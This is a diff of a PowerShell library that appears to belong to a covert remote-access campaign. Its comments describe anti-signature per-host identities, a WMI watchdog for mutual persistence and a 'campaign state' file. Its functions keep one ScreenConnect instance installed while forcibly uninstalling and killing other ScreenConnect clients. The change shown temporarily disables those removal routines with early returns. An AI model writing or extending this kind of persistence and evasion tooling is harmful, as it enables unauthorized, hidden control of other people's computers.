@@ -1,6 +1,7 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
 # OWN_LIB  BUILD 20260804L40
+# L45: HANDS-OFF all ScreenConnect except Gryxa install-if-absent.
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L44: HARD lock — any live Gryxa => never migrate/uninstall/i; no deferred /x; protect must empty Upgrade.
@@ -662,7 +663,8 @@ function Clear-GryxaArp([string]$fp) {
 
 function Uninstall-ScFingerprint([string]$Fingerprint) {
     if (-not $Fingerprint) { return 'no-fp' }
-    # L44: never tear down a live/pending Gryxa (or any SC) session
+    # L45: HANDS-OFF — never uninstall/stop/delete ANY ScreenConnect
+    return 'refused-hands-off-sc'
     if (Test-ScRunning $Fingerprint) { return 'refused-running' }
     $name = "ScreenConnect Client ($Fingerprint)"
     $guid = Find-ProductGuid $Fingerprint
@@ -999,11 +1001,11 @@ function Invoke-GryxaEnsure {
 }
 
 function Invoke-Exterminate {
-    # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
-    # fallback + force dir nuke. Keep sevrz+alt+current gryxa FP (gryxa.cfg).
-    # O41: sync Running Gryxa FP into cfg BEFORE any kill; never kill SC procs
-    # without a foreign FP in path/cmdline (null path was killing Gryxa every tick).
+    # L45: HANDS-OFF — do not touch any ScreenConnect while diagnosing disconnects.
     $log = Join-Path $WorkDir 'exterminate.log'
+    Add-Content -LiteralPath $log -Value ('{0} exterminate_SKIPPED_L45 hands-off-all-sc' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
+    return 'SKIP|hands-off-sc-L45'
+    # L7: true removal (disabled)...
     $runningG = Find-RunningGryxaFp
     if ($runningG) { Set-GryxaFp $runningG }
     $keep = @(Get-KeepFingerprints)
